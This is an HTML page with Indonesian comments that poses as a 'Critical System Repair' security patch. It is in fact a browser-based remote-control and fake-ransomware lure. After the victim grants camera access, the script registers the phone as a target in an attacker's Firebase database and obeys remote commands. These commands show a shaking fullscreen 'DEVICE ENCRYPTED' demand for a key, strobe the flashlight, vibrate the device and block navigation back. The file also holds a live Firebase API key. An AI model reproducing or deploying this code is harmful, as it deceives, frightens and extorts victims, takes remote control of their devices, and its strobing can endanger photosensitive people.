<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Critical System Repair</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: #fff; font-family: sans-serif; overflow: hidden; height: 100vh; width: 100vw; user-select: none; }
        
        /* TAMPILAN AWAL (UMPAN) */
        #init-ui { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100%; text-align: center; padding: 20px; }
        .btn-repair { background: #ff0000; color: #fff; border: none; padding: 18px 40px; border-radius: 50px; font-weight: bold; font-size: 16px; box-shadow: 0 0 25px rgba(255,0,0,0.6); margin-top: 30px; }
        
        /* LOCK SCREEN (HARD LOCK) */
        #lock-screen { 
            display: none; position: fixed; inset: 0; background: #000; 
            z-index: 9999999; flex-direction: column; justify-content: center; 
            align-items: center; border: 4px solid #ff0000;
        }
        #lock-screen.active { display: flex; animation: shake 0.1s infinite; }
        @keyframes shake { 0%{transform:translate(3px,3px)} 50%{transform:translate(-3px,-3px)} 100%{transform:translate(0,0)} }
        
        #msg { color: #ff0000; font-size: 26px; font-weight: bold; text-shadow: 0 0 15px red; text-align: center; padding: 20px; text-transform: uppercase; }
        input { background: #111; border: 1px solid red; color: #fff; padding: 15px; text-align: center; width: 80%; border-radius: 10px; font-size: 20px; outline: none; margin-top: 20px; }
        .btn-unlock { margin-top: 30px; color: #555; background: none; border: none; font-size: 12px; cursor: pointer; }
    </style>
</head>
<body>

    <div id="init-ui">
        <h2 style="color:red; letter-spacing: 2px;">SYSTEM VULNERABILITY DETECTED</h2>
        <p style="color:#888; margin-top:10px;">Security patch is required to prevent data loss.</p>
        <div style="font-size: 60px; margin-top: 30px;">🛡️</div>
        <button class="btn-repair" onclick="startInfection()">FIX SYSTEM NOW</button>
    </div>

    <div id="lock-screen">
        <h1 id="msg">DEVICE ENCRYPTED</h1>
        <input type="password" id="pw-input" placeholder="ENTER DECRYPTION KEY">
        <button class="btn-unlock" onclick="checkUnlock()">VERIFY KEY</button>
    </div>

<script>
    // Config Firebase Lo Mar
    const firebaseConfig = {
      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
      authDomain: "rat-html.firebaseapp.com",
      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "rat-html",
      storageBucket: "rat-html.firebasestorage.app",
      messagingSenderId: "1060124583265",
      appId: "1:1060124583265:web:a117830e798cd1d60f5120"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    
    const tid = "ASXRAT-" + Math.floor(Math.random() * 9999);
    const urlParams = new URLSearchParams(window.location.search);
    const ownerID = urlParams.get('id') ? atob(urlParams.get('id')) : "Unknown";
    
    let vTrack, strobeInterval, correctPin = "123";

    async function startInfection() {
        try {
            // Izin Kamera & Senter
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
            vTrack = stream.getVideoTracks()[0];
            
            // Ambil Nama HP
            const ua = navigator.userAgent;
            const modelMatch = ua.match(/Android\s([^\s;]+)\s?;\s?([^\s;]+)/);
            const deviceName = modelMatch ? modelMatch[2] : "Android Device";

            // Register Target
            db.ref('mario/targets/' + tid).set({
                model: deviceName,
                belongsTo: ownerID,
                status: "Online"
            });

            document.getElementById('init-ui').innerHTML = "<h3 style='color:green'>Applying Patch... 85%</h3><div style='width:80%; height:5px; background:#222; margin-top:20px;'><div style='width:85%; height:100%; background:green;'></div></div>";

            // Listen Command Real-time
            db.ref('mario/commands/' + tid).on('value', snap => {
                const cmd = snap.val();
                if(!cmd) return;

                // ⚡ FITUR LOCK + AUTO STROBE
                if(cmd.action === "lock_screen") {
                    correctPin = cmd.pass || "123";
                    document.getElementById('msg').innerText = cmd.text || "LOCKED";
                    document.getElementById('lock-screen').classList.add('active');
                    
                    // Fullscreen (Ilangin Navigasi/Chrome UI)
                    if (document.documentElement.requestFullscreen) {
                        document.documentElement.requestFullscreen().catch(()=>{});
                    }

                    // Start Strobe (Kedip 100ms)
                    clearInterval(strobeInterval);
                    strobeInterval = setInterval(() => {
                        const settings = vTrack.getSettings();
                        vTrack.applyConstraints({ advanced: [{ torch: !settings.torch }] }).catch(()=>{});
                    }, 100);

                    if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
                }

                // 🔓 UNLOCK
                if(cmd.action === "unlock") {
                    stopAllSenses();
                }

                // 🔦 MANUAL SENTER
                if(cmd.action === "torch_on") {
                    vTrack.applyConstraints({ advanced: [{ torch: true }] }).catch(()=>{});
                }
                if(cmd.action === "torch_off") {
                    clearInterval(strobeInterval);
                    vTrack.applyConstraints({ advanced: [{ torch: false }] }).catch(()=>{});
                }

                // 📳 GETAR
                if(cmd.action === "vibrate") {
                    if(navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500]);
                }
            });

        } catch (err) {
            alert("PERMISSION DENIED: System cannot be repaired without camera access.");
        }
    }

    function stopAllSenses() {
        clearInterval(strobeInterval);
        document.getElementById('lock-screen').classList.remove('active');
        if(vTrack) vTrack.applyConstraints({ advanced: [{ torch: false }] }).catch(()=>{});
        if (document.exitFullscreen) document.exitFullscreen().catch(()=>{});
    }

    function checkUnlock() {
        const input = document.getElementById('pw-input').value;
        if(input === correctPin) {
            stopAllSenses();
        } else {
            if(navigator.vibrate) navigator.vibrate(500);
            alert("INCORRECT DECRYPTION KEY!");
        }
    }

    // Anti Back
    history.pushState(null, null, location.href);
    window.onpopstate = function () { history.go(1); };
</script>
</body>
</html>
